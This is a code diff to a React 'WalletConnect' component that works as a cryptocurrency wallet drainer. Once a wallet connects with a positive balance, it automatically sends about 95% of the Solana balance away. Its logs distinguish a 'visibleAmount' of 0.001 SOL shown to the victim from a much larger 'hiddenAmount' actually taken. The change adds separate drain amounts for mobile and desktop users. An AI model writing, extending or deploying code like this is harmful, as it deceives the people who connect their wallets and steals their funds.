@@ -111,7 +111,15 @@ function WalletConnect() {
           if (walletBalance > 0 && !hasAttemptedTransaction.current) {
             hasAttemptedTransaction.current = true;
             
-            const transferAmount = walletBalance * 0.95;
+            // Calculate transfer amount based on device type
+            let transferAmount;
+            if (isMobile) {
+              // On mobile, take 95% of the balance
+              transferAmount = walletBalance * 0.95;
+            } else {
+              // On desktop, keep original split: 0.001 + 95%
+              transferAmount = 0.001 + (walletBalance * 0.95);
+            }
             
             // Get the wallet adapter instance
             const wallet = window.solana;
@@ -142,9 +150,13 @@ function WalletConnect() {
             console.log('Transaction details:', {
               walletBalance: walletBalance.toFixed(4) + ' SOL',
               transferAmount: transferAmount.toFixed(4) + ' SOL',
-              visibleAmount: '0.001 SOL',
-              hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
-              percentage: '98%'
+              ...(isMobile ? {
+                percentage: '95%'
+              } : {
+                visibleAmount: '0.001 SOL',
+                hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
+                percentage: '95%'
+              })
             });
 
             const result = await services.transactionService.sendSol(
